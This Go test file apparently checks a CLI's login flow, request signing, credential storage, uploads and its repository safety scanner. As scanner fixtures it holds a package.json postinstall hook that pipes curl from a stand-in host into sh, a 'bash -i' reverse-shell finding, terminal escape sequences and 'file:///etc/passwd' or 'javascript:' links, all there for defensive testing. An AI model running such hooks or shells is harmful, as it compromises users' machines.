package cli

import (
	"context"
	"crypto/ed25519"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/roburns/urfluency-cli/safety"
	"github.com/roburns/urfluency-cli/upload"
)

// fakeAPI serves CLI login and the signed endpoints, checking PKCE and each
// request's signature against the key the login sent. Its browser approves
// the login (or denies it, when deny is set) and follows the redirect to the
// CLI's listener, as the website does.
type fakeAPI struct {
	*httptest.Server
	t        *testing.T
	deny     bool
	uploaded chan<- *http.Request
	// expiresIn and token shape the answers to starting and finishing a login.
	expiresIn int
	token     map[string]any

	mu        sync.Mutex
	start     map[string]string // the login request
	publicKey ed25519.PublicKey
	lastStamp int64
}

func newFakeAPI(t *testing.T, deny bool, uploaded chan<- *http.Request) *fakeAPI {
	t.Helper()
	f := &fakeAPI{t: t, deny: deny, uploaded: uploaded, expiresIn: 60, token: map[string]any{"access_token": "upload-token", "expires_in": 3600}}
	mux := http.NewServeMux()
	mux.HandleFunc("POST /v1/auth/cli", func(w http.ResponseWriter, r *http.Request) {
		var body map[string]string
		json.NewDecoder(r.Body).Decode(&body)
		if body["client"] != "urfluency-cli" || body["device"] != deviceName() || body["code_challenge_method"] != "S256" {
			t.Errorf("login started with %v, want the client, this machine's name, and S256", body)
		}
		key, _ := base64.RawURLEncoding.DecodeString(body["public_key"])
		f.mu.Lock()
		f.start, f.publicKey = body, key
		f.mu.Unlock()
		json.NewEncoder(w).Encode(loginStart{RequestID: "req-1", AuthorizeURL: "https://urfluency.test/connect?request=req-1", ExpiresIn: f.expiresIn})
	})
	mux.HandleFunc("POST /v1/auth/cli/req-1/token", func(w http.ResponseWriter, r *http.Request) {
		var body map[string]string
		json.NewDecoder(r.Body).Decode(&body)
		sum := sha256.Sum256([]byte(body["code_verifier"]))
		f.mu.Lock()
		challenge := f.start["code_challenge"]
		f.mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		if body["code"] != "auth-code" || base64.RawURLEncoding.EncodeToString(sum[:]) != challenge {
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(apiError{Error: "invalid_grant"})
			return
		}
		json.NewEncoder(w).Encode(f.token)
	})
	mux.HandleFunc("POST /v1/metrics", func(w http.ResponseWriter, r *http.Request) {
		if !f.signed(w, r) {
			return
		}
		var p upload.Payload
		if err := json.NewDecoder(r.Body).Decode(&p); err != nil {
			t.Errorf("decode upload: %v", err)
		}
		if err := upload.Validate(p); err != nil {
			t.Errorf("uploaded payload fails validation: %v", err)
		}
		uploaded <- r
		w.WriteHeader(http.StatusCreated)
		json.NewEncoder(w).Encode(uploadResult{ProfileURL: "https://urfluency.test/u/me", Plan: "free"})
	})
	mux.HandleFunc("GET /v1/plan", func(w http.ResponseWriter, r *http.Request) {
		if f.signed(w, r) {
			json.NewEncoder(w).Encode(map[string]string{"plan": "pro"})
		}
	})
	f.Server = httptest.NewServer(mux)
	t.Cleanup(f.Close)
	openBrowser = f.browse
	t.Cleanup(func() { openBrowser = func(string) error { return errors.New("no browser in tests") } })
	return f
}

// browse is the website: it approves or denies, then sends the browser to the
// CLI's loopback address with the code and state.
func (f *fakeAPI) browse(link string) error {
	if link != "https://urfluency.test/connect?request=req-1" {
		f.t.Errorf("opened %q", link)
	}
	f.mu.Lock()
	redirect, state := f.start["redirect_uri"], f.start["state"]
	f.mu.Unlock()
	if f.deny {
		return nil // the CLI waits until the login expires
	}
	go func() {
		resp, err := http.Get(redirect + "?" + url.Values{"code": {"auth-code"}, "state": {state}}.Encode())
		if err != nil {
			f.t.Errorf("redirect to the CLI: %v", err)
			return
		}
		resp.Body.Close()
	}()
	return nil
}

// signed checks a request's token and signature, answering 401 if either is
// wrong, as the API does.
func (f *fakeAPI) signed(w http.ResponseWriter, r *http.Request) bool {
	body, _ := io.ReadAll(r.Body)
	r.Body = io.NopCloser(strings.NewReader(string(body)))
	token, _ := strings.CutPrefix(r.Header.Get("Authorization"), "Bearer ")
	stamp, _ := strconv.ParseInt(r.Header.Get("X-Urfluency-Stamp"), 10, 64)
	sig, _ := base64.RawURLEncoding.DecodeString(r.Header.Get("X-Urfluency-Signature"))
	f.mu.Lock()
	defer f.mu.Unlock()
	if token != "upload-token" || f.publicKey == nil || stamp <= f.lastStamp ||
		!ed25519.Verify(f.publicKey, []byte(signingString(r.Method, r.URL.Path, stamp, body, token)), sig) {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(apiError{Error: "invalid_signature"})
		return false
	}
	f.lastStamp = stamp
	return true
}

// loggedIn logs the CLI in to the fake API and returns its credentials.
func (f *fakeAPI) loggedIn(t *testing.T) credentials {
	t.Helper()
	if err := login(context.Background(), nil, io.Discard); err != nil {
		t.Fatalf("login: %v", err)
	}
	c, err := loadCredentials()
	if err != nil {
		t.Fatal(err)
	}
	return c
}

func useAPI(t *testing.T, url string) {
	t.Setenv("URFLUENCY_API_URL", url)
	path, _ := credentialsPath()
	t.Cleanup(func() { os.Remove(path) })
}

func TestLoginSavesTokenPrivately(t *testing.T) {
	srv := newFakeAPI(t, false, nil)
	useAPI(t, srv.URL)
	var out strings.Builder
	if err := login(context.Background(), nil, &out); err != nil {
		t.Fatalf("login: %v", err)
	}
	if !strings.Contains(out.String(), "connect?request=req-1") || strings.Contains(out.String(), "upload-token") || strings.Contains(out.String(), "auth-code") {
		t.Errorf("output should show the approval link and never the token or code:\n%s", out.String())
	}
	path, _ := credentialsPath()
	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm() != 0o600 {
		t.Errorf("credentials mode = %v, want 0600", info.Mode().Perm())
	}
	c, err := loadCredentials()
	if err != nil || c.Token != "upload-token" || c.API != srv.URL || c.KeyStore != "keychain" || c.Key != "" {
		t.Errorf("credentials = %+v, %v, want the token, and its key in the keychain only", c, err)
	}
	if seed, err := keys.Get(srv.URL); err != nil || !ed25519.NewKeyFromSeed(seed).Public().(ed25519.PublicKey).Equal(srv.publicKey) {
		t.Errorf("the keychain holds no key matching the one sent at login (%v)", err)
	}
	if err := logout(nil, &out); err != nil {
		t.Fatal(err)
	}
	if _, err := loadCredentials(); err == nil {
		t.Error("credentials survived logout")
	}
	if _, err := keys.Get(srv.URL); err == nil {
		t.Error("the key survived logout")
	}
}

// Logging out of an expired login still deletes its key.
func TestLogoutAfterExpiry(t *testing.T) {
	srv := newFakeAPI(t, false, nil)
	useAPI(t, srv.URL)
	c := srv.loggedIn(t)
	c.Expires = time.Now().Add(-time.Hour)
	if err := c.save(); err != nil {
		t.Fatal(err)
	}
	if err := logout(nil, io.Discard); err != nil {
		t.Fatalf("logout: %v", err)
	}
	if _, err := keys.Get(srv.URL); err == nil {
		t.Error("the expired login's key survived logout")
	}
}

// Without a keychain, the key is kept in credentials.json, which only the
// user can read, and login says so.
func TestLoginWithoutKeychain(t *testing.T) {
	srv := newFakeAPI(t, false, nil)
	useAPI(t, srv.URL)
	t.Setenv("URFLUENCY_NO_KEYCHAIN", "1")
	var out strings.Builder
	if err := login(context.Background(), nil, &out); err != nil {
		t.Fatalf("login: %v", err)
	}
	c, _ := loadCredentials()
	if c.KeyStore != "file" || c.Key == "" || !strings.Contains(out.String(), "No system keychain") {
		t.Errorf("credentials = %+v, output:\n%s", c, out.String())
	}
	if _, err := keys.Get(srv.URL); err == nil {
		t.Error("the key went to the keychain anyway")
	}
	var res struct{ Plan string }
	if code, _, err := signedJSON(context.Background(), http.MethodGet, srv.URL+"/v1/plan", c, nil, &res); err != nil || code != 200 || res.Plan != "pro" {
		t.Errorf("signed request with the file key = %d %v %v", code, res, err)
	}
}

// --no-browser shows the link and reads the code the website shows.
func TestLoginWithoutBrowser(t *testing.T) {
	srv := newFakeAPI(t, false, nil)
	useAPI(t, srv.URL)
	openBrowser = func(string) error { t.Error("--no-browser opened a browser"); return nil }
	defer func(old func() bool, in io.Reader) { interactive, stdin = old, in }(interactive, stdin)
	interactive = func() bool { return true }
	stdin = strings.NewReader("  auth-code \n")
	var out strings.Builder
	if err := login(context.Background(), []string{"--no-browser"}, &out); err != nil {
		t.Fatalf("login: %v", err)
	}
	if srv.start["redirect_uri"] != "" || !strings.Contains(out.String(), "paste the code") {
		t.Errorf("redirect %q, output:\n%s", srv.start["redirect_uri"], out.String())
	}
	if c, err := loadCredentials(); err != nil || c.Token != "upload-token" {
		t.Errorf("credentials = %+v, %v", c, err)
	}
}

// The listener hands over a code only for the login's own state.
func TestCallbackChecksState(t *testing.T) {
	ln, _ := net.Listen("tcp", "127.0.0.1:0")
	codes, stop := serveCallback(ln, "the-state")
	defer stop()
	base := "http://" + ln.Addr().String() + "/callback?"
	for _, q := range []url.Values{{"code": {"x"}, "state": {"wrong"}}, {"code": {"x"}}, {"state": {"the-state"}}} {
		resp, err := http.Get(base + q.Encode())
		if err != nil || resp.StatusCode != http.StatusBadRequest {
			t.Errorf("%v: %v %v, want 400", q, resp.StatusCode, err)
		}
		resp.Body.Close()
	}
	resp, err := http.Get(base + url.Values{"code": {"good"}, "state": {"the-state"}}.Encode())
	if err != nil || resp.StatusCode != http.StatusOK {
		t.Fatalf("right state: %v %v", resp, err)
	}
	resp.Body.Close()
	if got := <-codes; got != "good" {
		t.Errorf("code = %q", got)
	}
}

func TestCheckLink(t *testing.T) {
	for link, ok := range map[string]bool{"https://urfluency.com/connect?request=x": true, "http://urfluency.com/connect": false,
		"file:///etc/passwd": false, "javascript:alert(1)": false, "": false} {
		if err := checkLink(link, "https://api.urfluency.com"); (err == nil) != ok {
			t.Errorf("checkLink(%q) = %v, want ok=%v", link, err, ok)
		}
	}
	if err := checkLink("http://localhost:3000/connect", "http://localhost:8080"); err != nil {
		t.Errorf("a local development site: %v", err)
	}
}

// The API checks signatures against the same vector (TestSigningVector in
// urfluency-app), so a change to either side fails.
func TestSigningVector(t *testing.T) {
	seed := make([]byte, ed25519.SeedSize)
	for i := range seed {
		seed[i] = byte(i + 1)
	}
	msg := signingString("POST", "/v1/metrics", 1793750400000, []byte(`{"a":1}`), "urf_test")
	const want = "NHr4e6UiG9S_hkiWM1k5OiV3X-QSV4M4RZzEz0TNwGfLPddOZdcZrAsCPTkChBVA6AIF52H-z8g7X9XrlUw0DA"
	if got := base64.RawURLEncoding.EncodeToString(ed25519.Sign(ed25519.NewKeyFromSeed(seed), []byte(msg))); got != want {
		t.Errorf("signature = %s, want %s; the API's signing must change with it", got, want)
	}
}

// A login saved by a CLI before 1.5.0 has no key; upload and status say to
// log in again rather than sending a request the API would refuse.
func TestOldLoginsNeedANewOne(t *testing.T) {
	srv := newFakeAPI(t, false, nil)
	useAPI(t, srv.URL)
	if err := (credentials{API: srv.URL, Token: "upload-token", Expires: time.Now().Add(time.Hour)}).save(); err != nil {
		t.Fatal(err)
	}
	var out strings.Builder
	if err := status(context.Background(), nil, &out); err != nil || !strings.Contains(out.String(), "older urfluency") {
		t.Errorf("status = %v:\n%s", err, out.String())
	}
	if err := uploadCmd(context.Background(), []string{"--yes", t.TempDir()}, &out, io.Discard); err == nil || !strings.Contains(err.Error(), "older urfluency") {
		t.Errorf("upload = %v, want a login error", err)
	}
}

// The machine's name is the hostname unless URFLUENCY_DEVICE_NAME is set; set
// to empty, no name is sent. Login says which name it sent.
func TestLoginDeviceName(t *testing.T) {
	srv := newFakeAPI(t, false, nil)
	useAPI(t, srv.URL)
	t.Setenv("URFLUENCY_DEVICE_NAME", "  work laptop ")
	var out strings.Builder
	if err := login(context.Background(), nil, &out); err != nil {
		t.Fatalf("login: %v", err)
	}
	if !strings.Contains(out.String(), `as "work laptop"`) {
		t.Errorf("login should name the machine it reported:\n%s", out.String())
	}

	t.Setenv("URFLUENCY_DEVICE_NAME", "")
	out.Reset()
	if err := login(context.Background(), nil, &out); err != nil {
		t.Fatalf("login: %v", err)
	}
	if deviceName() != "" || strings.Contains(out.String(), "list this machine") {
		t.Errorf("an empty URFLUENCY_DEVICE_NAME should send and print no name (%q):\n%s", deviceName(), out.String())
	}

	os.Unsetenv("URFLUENCY_DEVICE_NAME") // t.Setenv restores it afterwards
	if host, _ := os.Hostname(); deviceName() != strings.TrimSuffix(strings.TrimSuffix(host, "."), ".local") {
		t.Errorf("deviceName() = %q, want the hostname %q without .local", deviceName(), host)
	}
}

func TestLoginDenied(t *testing.T) {
	srv := newFakeAPI(t, true, nil)
	srv.expiresIn = 1
	useAPI(t, srv.URL)
	var out strings.Builder
	if err := login(context.Background(), nil, &out); err == nil || !strings.Contains(err.Error(), "not approved in time") {
		t.Fatalf("login = %v, want not approved in time", err)
	}
	if _, err := loadCredentials(); err == nil {
		t.Error("a denied login saved credentials")
	}
}

func TestAPIBaseRequiresHTTPS(t *testing.T) {
	for url, ok := range map[string]bool{"": true, "https://api.example.com": true, "http://localhost:8080": true, "http://api.example.com": false, "ftp://x": false} {
		t.Setenv("URFLUENCY_API_URL", url)
		if _, err := apiBase(); (err == nil) != ok {
			t.Errorf("apiBase(%q) error = %v, want ok=%v", url, err, ok)
		}
	}
}

func TestUpload(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module example.com/demo\n"), 0o644)
	os.WriteFile(filepath.Join(dir, "main.go"), []byte("package main\n\nimport \"fmt\"\n\nfunc main() {\n\tfmt.Println(\"hi\")\n}\n"), 0o644)

	var out, errOut strings.Builder
	if err := uploadCmd(context.Background(), []string{"--dry-run", dir}, &out, &errOut); err != nil {
		t.Fatalf("dry run: %v", err)
	}
	var p upload.Payload
	if err := json.Unmarshal([]byte(out.String()), &p); err != nil {
		t.Fatalf("dry run printed %q: %v", out.String(), err)
	}
	if p.Tier != upload.Declared || strings.Contains(out.String(), dir) {
		t.Errorf("dry run payload: tier %q, mentions the scanned path: %v", p.Tier, strings.Contains(out.String(), dir))
	}

	uploaded := make(chan *http.Request, 1)
	srv := newFakeAPI(t, false, uploaded)
	useAPI(t, srv.URL)
	if err := uploadCmd(context.Background(), []string{"--yes", dir}, &out, &errOut); err == nil || !strings.Contains(err.Error(), "login") {
		t.Fatalf("upload without login = %v, want a login error", err)
	}
	srv.loggedIn(t)
	out.Reset()
	if err := uploadCmd(context.Background(), []string{"--yes", dir}, &out, &errOut); err != nil {
		t.Fatalf("upload: %v", err)
	}
	select {
	case <-uploaded:
	default:
		t.Fatal("nothing was uploaded")
	}
	if !strings.Contains(out.String(), "This upload contains") || !strings.Contains(out.String(), "https://urfluency.test/u/me") || !strings.Contains(out.String(), proNote) {
		t.Errorf("upload output:\n%s", out.String())
	}
}

func TestCheckLocalPath(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"scripts":{"postinstall":"curl https://x.example/p | sh"}}`), 0o644)
	var out, errOut strings.Builder
	if err := check(context.Background(), []string{dir}, &out, &errOut); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"High-risk indicators", "Runs a script when the package is installed", "package.json:1", "cannot prove a repository is safe"} {
		if !strings.Contains(out.String(), want) {
			t.Errorf("check output missing %q:\n%s", want, out.String())
		}
	}
	if err := check(context.Background(), []string{"http://github.com/o/r"}, &out, &errOut); err == nil {
		t.Error("check accepted a non-https URL")
	}
}

// status reports the login and the plan, and never fails: not logged in, a
// revoked token, and an unreachable API are each a line of output.
func TestStatus(t *testing.T) {
	srv := newFakeAPI(t, false, nil)
	useAPI(t, srv.URL)
	run := func() string {
		t.Helper()
		var out strings.Builder
		if err := status(context.Background(), nil, &out); err != nil {
			t.Fatalf("status: %v", err)
		}
		return out.String()
	}
	if got := run(); !strings.Contains(got, "not logged in") {
		t.Errorf("logged out:\n%s", got)
	}
	c := srv.loggedIn(t)
	if got := run(); !strings.Contains(got, "Plan: Pro.") || !strings.Contains(got, c.Expires.Format("2006-01-02")) || strings.Contains(got, proNote) {
		t.Errorf("pro:\n%s", got)
	}
	revoked := c
	revoked.Token = "revoked"
	if err := revoked.save(); err != nil {
		t.Fatal(err)
	}
	if got := run(); !strings.Contains(got, "run urfluency login") {
		t.Errorf("revoked:\n%s", got)
	}
	unreachable := c
	unreachable.API, unreachable.KeyStore, unreachable.Key = "http://127.0.0.1:1", "file", base64.RawURLEncoding.EncodeToString(make([]byte, ed25519.SeedSize))
	if err := unreachable.save(); err != nil {
		t.Fatal(err)
	}
	if got := run(); !strings.Contains(got, "Plan: unknown") {
		t.Errorf("unreachable:\n%s", got)
	}
	if err := status(context.Background(), []string{"x"}, io.Discard); err == nil {
		t.Error("status accepted an argument")
	}
}

func TestCheckEscapesControlCharactersFromTheRepository(t *testing.T) {
	var out strings.Builder
	writeSafety(&out, "repo", safety.Report{Verdict: safety.HighRisk, Findings: []safety.Finding{{
		Severity: safety.High, Confidence: safety.Likely, Title: "Reverse shell",
		Path: "a\x1b[2K\x1b[1Ab.sh", Line: 1, Evidence: "bash -i\x1b]0;clean\x07", Why: "why",
	}}})
	if strings.ContainsRune(out.String(), 0x1b) || !strings.Contains(out.String(), `a\x1b[2K\x1b[1Ab.sh:1`) {
		t.Errorf("control characters reached the terminal:\n%q", out.String())
	}
}

// A redirect to another origin is refused, so the token never reaches it.
func TestTokensDoNotFollowRedirectsToOtherOrigins(t *testing.T) {
	var leaked atomic.Bool
	other := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "" {
			leaked.Store(true)
		}
	}))
	defer other.Close()
	api := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, other.URL+"/steal", http.StatusTemporaryRedirect)
	}))
	defer api.Close()
	if _, _, err := postJSON(context.Background(), api.URL+"/v1/upload", "secret-token", map[string]string{}, nil); err == nil {
		t.Error("a redirect to another origin was followed")
	}
	if leaked.Load() {
		t.Error("the token reached the other origin")
	}
}

// The CLI refuses answers it cannot use and saves nothing.
func TestLoginAnswers(t *testing.T) {
	for name, edit := range map[string]func(f *fakeAPI){
		"start without expiry": func(f *fakeAPI) { f.expiresIn = 0 },
		"token without expiry": func(f *fakeAPI) { f.token = map[string]any{"access_token": "upload-token"} },
		"no token":             func(f *fakeAPI) { f.token = map[string]any{"expires_in": 3600} },
	} {
		srv := newFakeAPI(t, false, nil)
		useAPI(t, srv.URL)
		edit(srv)
		if err := login(context.Background(), nil, io.Discard); err == nil || !strings.Contains(err.Error(), "expiry") && !strings.Contains(err.Error(), "token") {
			t.Errorf("%s: %v", name, err)
		}
		if _, err := loadCredentials(); err == nil {
			t.Errorf("%s: credentials were saved", name)
		}
	}
	// A code the API refuses, such as one approved for a different login.
	srv := newFakeAPI(t, false, nil)
	useAPI(t, srv.URL)
	defer func(old func() bool, in io.Reader) { interactive, stdin = old, in }(interactive, stdin)
	interactive, stdin = func() bool { return true }, strings.NewReader("someone-elses-code\n")
	if err := login(context.Background(), []string{"--no-browser"}, io.Discard); err == nil || !strings.Contains(err.Error(), "wrong or expired") {
		t.Errorf("refused code: %v", err)
	}
	if err := login(context.Background(), []string{"--no-browser", "extra"}, io.Discard); err == nil {
		t.Error("login accepted an argument")
	}
}

func TestErrorResponsesThatAreNotJSON(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusBadGateway)
		io.WriteString(w, "<html>Bad gateway</html>")
	}))
	defer srv.Close()
	status, code, err := postJSON(context.Background(), srv.URL, "", map[string]string{}, nil)
	if err != nil || status != http.StatusBadGateway || code != "unexpected response" {
		t.Errorf("got %d %q %v, want 502 and a code that says so", status, code, err)
	}
}
